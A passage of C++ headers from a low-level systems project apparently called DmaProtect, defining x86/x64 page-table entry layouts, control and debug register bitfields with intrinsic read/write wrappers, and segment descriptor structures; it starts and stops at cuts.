                    unsigned long long D : 1; // Dirty
                    unsigned long long PS : 1; // PageSize == 1
                    unsigned long long G : 1; // Global Page
                    unsigned long long AVL : 3; // Available to software
                    unsigned long long PAT : 1; // Page-Attribute Table
                    unsigned long long : 8;
                    unsigned long long PhysicalPageFrameNumber : 31;
                    unsigned long long Available : 11;
                    unsigned long long NX : 1; // No Execute
                } page2Mb;

                constexpr PhysicalAddress physicalPageBase() const noexcept
                {
                    return PhysicalAddress{ Pfn::toLarge(this->page2Mb.PhysicalPageFrameNumber) };
                }

                constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
                {
                    return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdpeNonPageSize.pdePageSize.page2Mb.PageOffset };
                }
            };
            static_assert(sizeof(Pde<PageSize::pse>) == sizeof(unsigned long long));

            //
            // Describes 2 Mb in one of the following ways:
            //   2Mb page itself  | PML4E -> PDPE(PS=0) -> PDE(PS=1) -> PA (2Mb)
            //   512x4Kb pages    | PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (4Kb)
            //
            template <>
            union Pde<PageSize::generic>
            {
                unsigned long long raw;
                struct
                {
                    unsigned long long P : 1; // Present
                    unsigned long long RW : 1; // Read/Write
                    unsigned long long US : 1; // User/Supervisor
                    unsigned long long PWT : 1; // Page-Level Writethrough
                    unsigned long long PCD : 1; // Page-Level Cache Disable
                    unsigned long long A : 1; // Accessed
                    unsigned long long : 1;
                    unsigned long long PS : 1; // PageSize
                    unsigned long long : 1;
                    unsigned long long AVL : 3; // Available to software
                    unsigned long long : 51;
                    unsigned long long NX : 1; // No Execute
                } layout;

                Pde<PageSize::nonPse> nonPse;
                Pde<PageSize::pse> pse;

                constexpr PageSize pageSize() const noexcept
                {
                    return this->layout.PS
                        ? PageSize::pse
                        : PageSize::nonPse;
                }
            };
            static_assert(sizeof(Pde<PageSize::generic>) == sizeof(unsigned long long));

            using PdeGeneric = Pde<PageSize::generic>;
            using PdeNonPse = Pde<PageSize::nonPse>;
            using PdePse = Pde<PageSize::pse>;

            //
            // Describes 1 Gb of linear address space.
            //
            using Pd = PdeGeneric[512];

            constexpr PhysicalLayout<Pd> pd() const noexcept
            {
                return PhysicalLayout<Pd>{ Pfn::toPage(this->layout.PD) };
            }

            constexpr PhysicalLayout<PdeGeneric> pde(const LinearAddress& linear) const noexcept
            {
                return PhysicalLayout<PdeGeneric>{ this->pd().physicalAddress + linear.pdpeNonPageSize.generic.PageDirectoryOffset * k_entrySize };
            }
        };
        static_assert(sizeof(Pdpe<PageSize::nonPse>) == sizeof(unsigned long long));

        //
        // Describes 1Gb page: PML4E -> PDPE(PS=1) -> PA (1Gb)
        //
        template <>
        union Pdpe<PageSize::pse>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long D : 1; // Dirty
                unsigned long long PS : 1; // PageSize == 1
                unsigned long long G : 1; // Global Page
                unsigned long long AVL : 3; // Available to software
                unsigned long long PAT : 1; // Page-Attribute Table
                unsigned long long : 17;
                unsigned long long PhysicalPageFrameNumber : 22;
                unsigned long long Available : 11;
                unsigned long long NX : 1; // No Execute
            } page1Gb;

            constexpr PhysicalAddress physicalPageBase() const noexcept
            {
                return PhysicalAddress{ Pfn::toHuge(this->page1Gb.PhysicalPageFrameNumber) };
            }

            constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
            {
                return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdpePageSize.page1Gb.PageOffset };
            }
        };
        static_assert(sizeof(Pdpe<PageSize::pse>) == sizeof(unsigned long long));

        //
        // Describes 1 Gb in one of the following ways:
        //   1Gb page itself      | PML4E -> PDPE(PS=1) -> PA (1Gb)
        //   512x2Mb pages        | PML4E -> PDPE(PS=0) -> PDE(PS=1) -> PA (2Mb)
        //   512x[512x4Kb] pages  | PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (4Kb)
        //
        template <>
        union Pdpe<PageSize::generic>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long : 1;
                unsigned long long PS : 1; // PageSize
                unsigned long long : 1;
                unsigned long long AVL : 3; // Available to software
                unsigned long long : 51;
                unsigned long long NX : 1; // No Execute
            } layout;

            Pdpe<PageSize::nonPse> nonPse;
            Pdpe<PageSize::pse> pse;

            constexpr PageSize pageSize() const noexcept
            {
                return this->layout.PS
                    ? PageSize::pse
                    : PageSize::nonPse;
            }
        };
        static_assert(sizeof(Pdpe<PageSize::generic>) == sizeof(unsigned long long));

        using PdpeGeneric = Pdpe<PageSize::generic>;
        using PdpeNonPse = Pdpe<PageSize::nonPse>;
        using PdpePse = Pdpe<PageSize::pse>;

        //
        // Describes 512 Gb of linear address space.
        //
        using Pdp = PdpeGeneric[512];

        constexpr PhysicalLayout<Pdp> pdp() const noexcept
        {
            return PhysicalLayout<Pdp>{ Pfn::toPage(this->layout.PDP) };
        }

        constexpr PhysicalLayout<PdpeGeneric> pdpe(const LinearAddress& linear) const noexcept
        {
            return PhysicalLayout<PdpeGeneric>{ this->pdp().physicalAddress + linear.generic.PageDirectoryPointerOffset * k_entrySize };
        }
    };
    static_assert(sizeof(Pml4e) == sizeof(unsigned long long));

    //
    // Describes 262 Tb of linear address space.
    //
    using Pml4 = Pml4e[512];

    static constexpr PhysicalLayout<Pml4> pml4(const unsigned long long cr3Pfn) noexcept
    {
        return PhysicalLayout<Pml4>{ Pfn::toPage(cr3Pfn) };
    }

    static constexpr PhysicalLayout<Pml4e> pml4e(const unsigned long long cr3Pfn, const LinearAddress& linear) noexcept
    {
        return PhysicalLayout<Pml4e>{ pml4(cr3Pfn).physicalAddress + linear.generic.PageMapLevel4Offset * k_entrySize };
    }
};

template <>
struct Tables<Mode::longMode5Level> // EFER.LMA == 1, CR4.PAE is always 1, CR4.PSE is ignored, CR4.LA57 == 1
{
    static constexpr Mode k_mode = Mode::longMode5Level;
    static constexpr auto k_entrySize = sizeof(unsigned long long);
    using LinearAddress = LinearAddress<k_mode>;
    using Pfn = Pfn<k_mode>;

    union Pml5e
    {
        unsigned long long raw;
        struct
        {
            unsigned long long P : 1; // Present
            unsigned long long RW : 1; // Read/Write
            unsigned long long US : 1; // User/Supervisor
            unsigned long long PWT : 1; // Page-Level Writethrough
            unsigned long long PCD : 1; // Page-Level Cache Disable
            unsigned long long A : 1; // Accessed
            unsigned long long Ignored0 : 1;
            unsigned long long : 2;
            unsigned long long AVL : 3; // Available to software
            unsigned long long PML4 : 40; // Page frame number of Page-Map 4-Level table
            unsigned long long Available : 11;
            unsigned long long NX : 1; // No Execute
        } layout;

        using Tables4Level = Tables<Mode::longMode4Level>;

        using Pml4e = Tables4Level::Pml4e; // The same as in 4-level paging
        using Pml4 = Tables4Level::Pml4; // The same as in 4-level paging
    };
    static_assert(sizeof(Pml5e) == sizeof(unsigned long long));

    //
    // Describes 134 Pb of linear address space.
    //
    using Pml5 = Pml5e[512];

    static constexpr PhysicalLayout<Pml5> pml5(const unsigned long long cr3Pfn) noexcept
    {
        return PhysicalLayout<Pml5>{ Pfn::toPage(cr3Pfn) };
    }

    static constexpr PhysicalLayout<Pml5e> pml5e(const unsigned long long cr3Pfn, const LinearAddress& linear) noexcept
    {
        return PhysicalLayout<Pml5e>{ pml5(cr3Pfn).physicalAddress + linear.generic.PageMapLevel5Offset * k_entrySize };
    }
};



} // namespace Pte

#pragma pack(pop)
```

`DmaProtect/include/Arch/Registers.h`:

```h
#pragma once

/*
    Registers CR1, CR5..CR7, CR9..CR15, DR8..DR15 aren't implemented.
    Any attempt to access unimplemented registers results in an invalid-opcode exception (#UD).
*/

#include "Intrinsics.h"

#pragma pack(push, 1)


namespace Regs
{



enum class Mode
{
    unknown,
    legacy,
    longMode,
    native = (sizeof(void*) == sizeof(unsigned int))
        ? legacy
        : ((sizeof(void*) == sizeof(unsigned long long))
            ? longMode
            : unknown
            )
};



union Eflags
{
    unsigned int raw{};
    struct
    {
        unsigned int CF : 1; // Carry flag
        unsigned int MustBe1Bit1 : 1;
        unsigned int PF : 1; // Parity flag
        unsigned int MustBe0Bit3 : 1;
        unsigned int AF : 1; // Auxiliary carry flag
        unsigned int MustBe0Bit5 : 1;
        unsigned int ZF : 1; // Zero flag
        unsigned int SF : 1; // Sign flag
        unsigned int TF : 1; // Trap flag
        unsigned int IF : 1; // Interrupt enable flag
        unsigned int DF : 1; // Direction flag
        unsigned int OF : 1; // Overflow flag
        unsigned int IOPL : 2; // Input-output privilege level
        unsigned int NT : 1; // Nested task
        unsigned int MustBe0Bit15 : 1;
        unsigned int RF : 1; // Resume flag
        unsigned int VM : 1; // Virtual-8086 mode
        unsigned int AC : 1; // Alignment-check / access control
        unsigned int VIF : 1; // Virtual interrupt flag
        unsigned int VIP : 1; // Virtual interrupt pending
        unsigned int ID : 1; // ID flag
        unsigned int MustBe0Bit22 : 1;
        unsigned int MustBe0Bit23 : 1;
        unsigned int MustBe0Bit24 : 1;
        unsigned int MustBe0Bit25 : 1;
        unsigned int MustBe0Bit26 : 1;
        unsigned int MustBe0Bit27 : 1;
        unsigned int MustBe0Bit28 : 1;
        unsigned int MustBe0Bit29 : 1;
        unsigned int MustBe0Bit30 : 1;
        unsigned int MustBe0Bit31 : 1;
    } layout;
};

union Rflags
{
    unsigned long long raw{};
    decltype(Eflags::layout) layout;
};
static_assert(sizeof(Rflags) == sizeof(unsigned long long));



template <Mode mode>
union Cr0;

template <>
union Cr0<Mode::legacy>
{
    unsigned int raw;
    struct
    {
        unsigned int PE : 1; // Protection enabled
        unsigned int MP : 1; // Monitor coprocessor
        unsigned int EM : 1; // Emulation of 8087
        unsigned int TS : 1; // Task switched
        unsigned int ET : 1; // Extension type (readonly)
        unsigned int NE : 1; // Numeric error
        unsigned int Reserved0 : 10;
        unsigned int WP : 1; // Write protect
        unsigned int Reserved1 : 1;
        unsigned int AM : 1; // Alignment mask
        unsigned int Reserved3 : 10;
        unsigned int NW : 1; // Not writethrough
        unsigned int CD : 1; // Cache disable
        unsigned int PG : 1; // Paging
    } layout;
};
static_assert(sizeof(Cr0<Mode::legacy>) == sizeof(unsigned int));

template <>
union Cr0<Mode::longMode>
{
    unsigned long long raw;
    decltype(Cr0<Mode::legacy>::layout) layout;
};
static_assert(sizeof(Cr0<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Cr2;

template <>
union Cr2<Mode::legacy>
{
    unsigned int raw;
    unsigned int pf; // Page fault linear address
};
static_assert(sizeof(Cr2<Mode::legacy>) == sizeof(unsigned int));

template <>
union Cr2<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long pf; // Page fault linear address
};
static_assert(sizeof(Cr2<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Cr3;

template <>
union Cr3<Mode::legacy>
{
    unsigned int raw;
    struct
    {
        unsigned int : 3;
        unsigned int PWT : 1; // Write through
        unsigned int PCD : 1; // Cache disable
        unsigned int : 7;
        unsigned int PD : 20; // Physical PFN of a Page Directory table
    } nonPae;
    struct
    {
        unsigned int : 3;
        unsigned int PWT : 1; // Write through
        unsigned int PCD : 1; // Cache disable
        unsigned int PDP : 27; // Physical PFN of a Page Directory Pointer table
    } pae;
};
static_assert(sizeof(Cr3<Mode::legacy>) == sizeof(unsigned int));

template <>
union Cr3<Mode::longMode>
{
    unsigned long long raw;
    struct
    {
        unsigned long long : 3;
        unsigned long long PWT : 1; // Write through
        unsigned long long PCD : 1; // Cache disable
        unsigned long long : 7;
        unsigned long long PML4 : 40; // Physical PFN of a PML4 table
        unsigned long long : 12;
    } paging4Level; // CR4.LA57 == 0
    struct
    {
        unsigned long long : 3;
        unsigned long long PWT : 1; // Write through
        unsigned long long PCD : 1; // Cache disable
        unsigned long long : 7;
        unsigned long long PML5 : 40; // Physical PFN of a PML5 table
        unsigned long long : 12;
    } paging5Level; // CR4.LA57 == 1
};
static_assert(sizeof(Cr3<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Cr4;

template <>
union Cr4<Mode::legacy>
{
    unsigned int raw;
    struct
    {
        unsigned int VME : 1; // Virtual 8086-mode extensions
        unsigned int PVI : 1; // Protected-mode virtual interrupts
        unsigned int TSD : 1; // Timestamp disable
        unsigned int DE : 1; // Debugging extensions
        unsigned int PSE : 1; // Page size extensions
        unsigned int PAE : 1; // Physical address extension
        unsigned int MCE : 1; // Machine check enable
        unsigned int PGE : 1; // Page global enable
        unsigned int PCE : 1; // Performance-monitoring counter enable
        unsigned int OSFXSR : 1; // Operating system FXSAVE/FXSTOR support
        unsigned int OSXMMEXCPT : 1; // Operating system unmasked exception support
        unsigned int UMIP : 1; // Usermode instruction prevention
        unsigned int LA57 : 1; // 57-bit linear address (5-level paging enable)
        unsigned int VMXE : 1; // VMX-enable bit (Intel only)
        unsigned int SMXE : 1; // SMX-enable bit (Safer Mode Extensions, Intel only)
        unsigned int : 1;
        unsigned int FSGSBASE : 1; // Enable RDFSBASE, RDGSBASE, WRFSBASE and WRGSBASE instructions
        unsigned int PCIDE : 1; // PCID-enable bit (Process-Context Identifiers)
        unsigned int OSXSAVE : 1; // XSAVE and Processor Extended States Enable bit
        unsigned int KL : 1; // Key-Locker enable (Intel only)
        unsigned int SMEP : 1; // Supervisor mode execution prevention
        unsigned int SMAP : 1; // Supervisor mode access prevention
        unsigned int PKE : 1; // Protection key enable
        unsigned int CET : 1; // Control-flow Enforcement Technology
        unsigned int PKS : 1; // Enable protection keys for supervisor-mode pages (Intel only)
        unsigned int UINTR : 1; // User Interrupts Enable (Intel only)
        unsigned int : 6;
    } layout;
};
static_assert(sizeof(Cr4<Mode::legacy>) == sizeof(unsigned int));

template <>
union Cr4<Mode::longMode>
{
    unsigned long long raw;
    decltype(Cr4<Mode::legacy>::layout) layout;
};
static_assert(sizeof(Cr4<Mode::longMode>) == sizeof(unsigned long long));



// Task priority register (64-Bit only):
template <Mode mode>
union Cr8;

template <>
union Cr8<Mode::longMode>
{
    unsigned long long val;
    struct
    {
        unsigned long long TPR : 4; // Priority
        unsigned long long : 60; // Reserved
    } layout;
};
static_assert(sizeof(Cr8<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr0;

template <>
union Dr0<Mode::legacy>
{
    unsigned int raw;
    unsigned int bp0; // Breakpoint 0 linear address
};
static_assert(sizeof(Dr0<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr0<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long bp0; // Breakpoint 0 linear address
};
static_assert(sizeof(Dr0<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr1;

template <>
union Dr1<Mode::legacy>
{
    unsigned int raw;
    unsigned int bp1; // Breakpoint 1 linear address
};
static_assert(sizeof(Dr1<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr1<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long bp1; // Breakpoint 1 linear address
};
static_assert(sizeof(Dr1<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr2;

template <>
union Dr2<Mode::legacy>
{
    unsigned int raw;
    unsigned int bp2; // Breakpoint 2 linear address
};
static_assert(sizeof(Dr2<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr2<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long bp2; // Breakpoint 2 linear address
};
static_assert(sizeof(Dr2<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr3;

template <>
union Dr3<Mode::legacy>
{
    unsigned int raw;
    unsigned int bp3; // Breakpoint 3 linear address
};
static_assert(sizeof(Dr3<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr3<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long bp3; // Breakpoint 3 linear address
};
static_assert(sizeof(Dr3<Mode::longMode>) == sizeof(unsigned long long));



// Aliased to DR6:
template <Mode mode>
union Dr4;

template <>
union Dr4<Mode::legacy>
{
    unsigned int raw;
    unsigned int reserved;
};
static_assert(sizeof(Dr4<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr4<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long reserved;
};
static_assert(sizeof(Dr4<Mode::longMode>) == sizeof(unsigned long long));



// Aliased to DR7:
template <Mode mode>
union Dr5;

template <>
union Dr5<Mode::legacy>
{
    unsigned int raw;
    unsigned int reserved;
};
static_assert(sizeof(Dr5<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr5<Mode::longMode>
{
    unsigned long long raw;
    unsigned long long reserved;
};
static_assert(sizeof(Dr5<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr6;

template <>
union Dr6<Mode::legacy>
{
    unsigned int raw;
    struct
    {
        unsigned int B0 : 1; // Breakpoint #0 condition detected
        unsigned int B1 : 1; // Breakpoint #1 condition detected
        unsigned int B2 : 1; // Breakpoint #2 condition detected
        unsigned int B3 : 1; // Breakpoint #3 condition detected
        unsigned int FilledByOnes0 : 8; // Must be 0xFF (8 bits of ones: 0b1111_1111)
        unsigned int ReservedByZero : 1;
        unsigned int BD : 1; // Debug register access detected
        unsigned int BS : 1; // Single step
        unsigned int BT : 1; // Task switch
        unsigned int RTM : 1; // Intel only, must be 1 on AMD platforms
        unsigned int FilledByOnes1 : 15; // Must be 0x7FFF (15 bits of ones: 0b111_1111_1111_1111)
    } layout;
};
static_assert(sizeof(Dr6<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr6<Mode::longMode>
{
    unsigned long long raw;
    decltype(Dr6<Mode::legacy>::layout) layout;
};
static_assert(sizeof(Dr6<Mode::longMode>) == sizeof(unsigned long long));



template <Mode mode>
union Dr7;

template <>
union Dr7<Mode::legacy>
{
    unsigned int raw;
    struct
    {
        unsigned int L0 : 1; // Local  exact breakpoint #0 enabled
        unsigned int G0 : 1; // Global exact breakpoint #0 enabled
        unsigned int L1 : 1; // Local  exact breakpoint #1 enabled
        unsigned int G1 : 1; // Global exact breakpoint #1 enabled
        unsigned int L2 : 1; // Local  exact breakpoint #2 enabled
        unsigned int G2 : 1; // Global exact breakpoint #2 enabled
        unsigned int L3 : 1; // Local  exact breakpoint #3 enabled
        unsigned int G3 : 1; // Global exact breakpoint #3 enabled
        unsigned int LE : 1; // Local  exact breakpoint enabled
        unsigned int GE : 1; // Global exact breakpoint enabled
        unsigned int ReservedAsOne : 1;
        unsigned int RTM : 1; // Intel only, must be zero on AMD platforms
        unsigned int ReservedAsZero0 : 1;
        unsigned int GD : 1; // General detect enabled
        unsigned int ReservedAsZero1 : 2;
        unsigned int RW0 : 2; // 0b00 - Execute, 0b01 - Write, 0b10 - CR4.DE(0 - Undefined, 1 - I/O Reads & Writes), 0b11 - Read/Write only
        unsigned int LEN0 : 2; // 0b00 = 1 byte, 0b01 = 2 bytes, 0b10 = 8 bytes (long mode only, otherwise undefined), 0b11 = 4 bytes
        unsigned int RW1 : 2; // 0b00 - Execute, 0b01 - Write, 0b10 - CR4.DE(0 - Undefined, 1 - I/O Reads & Writes), 0b11 - Read/Write only
        unsigned int LEN1 : 2; // 0b00 = 1 byte, 0b01 = 2 bytes, 0b10 = 8 bytes (long mode only, otherwise undefined), 0b11 = 4 bytes
        unsigned int RW2 : 2; // 0b00 - Execute, 0b01 - Write, 0b10 - CR4.DE(0 - Undefined, 1 - I/O Reads & Writes), 0b11 - Read/Write only
        unsigned int LEN2 : 2; // 0b00 = 1 byte, 0b01 = 2 bytes, 0b10 = 8 bytes (long mode only, otherwise undefined), 0b11 = 4 bytes
        unsigned int RW3 : 2; // 0b00 - Execute, 0b01 - Write, 0b10 - CR4.DE(0 - Undefined, 1 - I/O Reads & Writes), 0b11 - Read/Write only
        unsigned int LEN3 : 2; // 0b00 = 1 byte, 0b01 = 2 bytes, 0b10 = 8 bytes (long mode only, otherwise undefined), 0b11 = 4 bytes
    } layout;
};
static_assert(sizeof(Dr7<Mode::legacy>) == sizeof(unsigned int));

template <>
union Dr7<Mode::longMode>
{
    unsigned long long raw;
    decltype(Dr7<Mode::legacy>::layout) layout;
};
static_assert(sizeof(Dr7<Mode::longMode>) == sizeof(unsigned long long));



namespace Native
{



template <typename RegLayout, auto getter, auto setter>
class Reg
{
public:
    using Layout = RegLayout;

private:
    Layout m_value;

public:
    static Reg query() noexcept
    {
        Reg reg;
        reg.read();
        return reg;
    }

    constexpr Reg() noexcept : m_value{}
    {
    }

    constexpr explicit Reg(decltype(m_value.raw) raw) noexcept : m_value{ .raw = raw }
    {
    }

    Reg(const Reg&) = default;
    Reg(Reg&&) noexcept = default;

    Reg& operator = (const Reg&) = default;
    Reg& operator = (Reg&&) noexcept = default;

    Reg& read() noexcept
    {
        m_value.raw = static_cast<decltype(m_value.raw)>(getter());
        return *this;
    }

    Reg& write() noexcept
    {
        setter(static_cast<decltype(m_value.raw)>(m_value.raw));
        return *this;
    }

    constexpr const Layout& operator * () const noexcept
    {
        return m_value;
    }

    constexpr Layout& operator * () noexcept
    {
        return m_value;
    }

    constexpr const Layout* operator -> () const noexcept
    {
        return &m_value;
    }

    constexpr Layout* operator -> () noexcept
    {
        return &m_value;
    }
};

template <Mode mode>
struct NativeEflags;

template <>
struct NativeEflags<Mode::legacy>
{
    using Layout = Regs::Eflags;
};

template <>
struct NativeEflags<Mode::longMode>
{
    using Layout = Regs::Rflags;
};

using Eflags = Reg<NativeEflags<Mode::native>, []() -> size_t { return __readeflags(); }, [](size_t value) { __writeeflags(value); }>;

using Cr0 = Reg<Regs::Cr0<Mode::native>, []() -> size_t { return __readcr0(); }, [](size_t value) { __writecr0(value); }>;
using Cr2 = Reg<Regs::Cr2<Mode::native>, []() -> size_t { return __readcr2(); }, [](size_t value) { __writecr2(value); }>;
using Cr3 = Reg<Regs::Cr3<Mode::native>, []() -> size_t { return __readcr3(); }, [](size_t value) { __writecr3(value); }>;
using Cr4 = Reg<Regs::Cr4<Mode::native>, []() -> size_t { return __readcr4(); }, [](size_t value) { __writecr4(value); }>;
using Cr8 = Reg<Regs::Cr8<Mode::native>, []() -> size_t { return __readcr8(); }, [](size_t value) { __writecr8(value); }>;

using Dr0 = Reg<Regs::Dr0<Mode::native>, []() -> size_t { return __readdr(0); }, [](size_t value) { __writedr(0, value); }>;
using Dr1 = Reg<Regs::Dr1<Mode::native>, []() -> size_t { return __readdr(1); }, [](size_t value) { __writedr(1, value); }>;
using Dr2 = Reg<Regs::Dr2<Mode::native>, []() -> size_t { return __readdr(2); }, [](size_t value) { __writedr(2, value); }>;
using Dr3 = Reg<Regs::Dr3<Mode::native>, []() -> size_t { return __readdr(3); }, [](size_t value) { __writedr(3, value); }>;
using Dr4 = Reg<Regs::Dr4<Mode::native>, []() -> size_t { return __readdr(4); }, [](size_t value) { __writedr(4, value); }>;
using Dr5 = Reg<Regs::Dr5<Mode::native>, []() -> size_t { return __readdr(5); }, [](size_t value) { __writedr(5, value); }>;
using Dr6 = Reg<Regs::Dr6<Mode::native>, []() -> size_t { return __readdr(6); }, [](size_t value) { __writedr(6, value); }>;
using Dr7 = Reg<Regs::Dr7<Mode::native>, []() -> size_t { return __readdr(7); }, [](size_t value) { __writedr(7, value); }>;



} // namespace Native



} // namespace Regs
#pragma pack(pop)
```

`DmaProtect/include/Arch/Segmentation.h`:

```h
#pragma once

#pragma pack(push, 1)

namespace Seg
{



enum class Mode
{
    unknown,
    legacy,
    longMode,
    native = (sizeof(void*) == sizeof(unsigned int))
        ? legacy
        : ((sizeof(void*) == sizeof(unsigned long long))
            ? longMode
            : unknown
            )
};



// Value of CS, DS, GS, FS, ES, SS, TR registers:
union SegmentSelector
{
    unsigned short val;
    struct
    {
        unsigned short Rpl : 2; // Requestor privilege level
        unsigned short TableIndicator : 1; // 0 = GDT using, 1 = LDT using
        unsigned short SelectorIndex : 13; // Entry base = Table base + SelectorIndex * sizeof(Table entry)
    } layout;
};
static_assert(sizeof(SegmentSelector) == sizeof(unsigned short));

template <Mode mode>
struct DescriptorTableRegister;

// Value of IDTR/GDTR/LDTR registers in legacy mode:
template <>
struct DescriptorTableRegister<Mode::legacy>
{
    unsigned short Limit; // Size of descriptor table in bytes
    unsigned int BaseAddress; // Points to the first entry in a descriptor table
};
static_assert(sizeof(DescriptorTableRegister<Mode::legacy>) == sizeof(unsigned short) + sizeof(unsigned int));

// Value of IDTR/GDTR/LDTR registers in long mode:
template <>
struct DescriptorTableRegister<Mode::longMode>
{
    unsigned short Limit; // Size of descriptor table in bytes
    unsigned long long BaseAddress; // Points to the first entry in a descriptor table
};
static_assert(sizeof(DescriptorTableRegister<Mode::longMode>) == sizeof(unsigned short) + sizeof(unsigned long long));



template <Mode mode>
struct Descriptor;

template <>
struct Descriptor<Mode::legacy>
{
    enum class Type
    {
        Reserved0,
        TypeAvailable16BitTss,
        TypeLdt,
        TypeBusy16BitTss,
        Type16BitCallGate,
        TypeTaskGate,
        Type16BitInterruptGate,
        Type16BitTrapGate,
        Reserved1,
        TypeAvailable32BitTss,
        Reserved2,
        TypeBusy32BitTss,
        Type32BitCallGate,
        Reserved3,
        Type32BitInterruptGate,
        Type32BitTrapGate
    };

    union Segment
    {
        unsigned long long val;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Type : 4; // SegmentDescriptorTypeLegacy
            unsigned long long System : 1; // 0 = System (LDT, TSS, Gate), 1 = User (Code, Data)
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long Reserved : 1;
            unsigned long long DefaultOperandSize : 1; // 1 = 32-bit, 0 = 16-bit
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [31:24]
        } generic;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Accessed : 1;
            unsigned long long Readable : 1;
            unsigned long long Conforming : 1;
            unsigned long long Type : 1; // Must be 1 (1 = Code, 0 = Data)
            unsigned long long System : 1; // Must be 1 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long Reserved : 1;
            unsigned long long DefaultOperandSize : 1; // 1 = 32-bit, 0 = 16-bit
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [31:24]
        } code;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Accessed : 1;
            unsigned long long Writeable : 1;
            unsigned long long ExpandDown : 1;
            unsigned long long Type : 1; // Must be 0 (1 = Code, 0 = Data)
            unsigned long long System : 1; // Must be 1 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long Reserved : 1;
            unsigned long long DefaultOperandSize : 1; // 1 = 32-bit, 0 = 16-bit
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [31:24]
        } data;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Type : 4;
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long Reserved : 2;
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [31:24]
        } ldt, tss;
    };
    static_assert(sizeof(Segment) == sizeof(unsigned long long));

    union Gate
    {
        struct
        {
            unsigned long long TargetCodeSegmentOffsetLow : 16; // [15:0]
            unsigned long long TargetCodeSegmentSelector : 16;
            unsigned long long ParameterCount : 5;
            unsigned long long Reserved : 3;
            unsigned long long Type : 4;
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long TargetCodeSegmentOffsetHigh : 16; // [31:16]
        } call;

        struct
        {
            unsigned long long TargetCodeSegmentOffsetLow : 16; // [15:0]
            unsigned long long TargetCodeSegmentSelector : 16;
            unsigned long long Reserved : 8;
            unsigned long long Type : 4;
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long TargetCodeSegmentOffsetHigh : 16; // [31:16]
        } interrupt, trap;

        struct
        {
            unsigned long long Reserved0 : 16;
            unsigned long long TssSelector : 16;
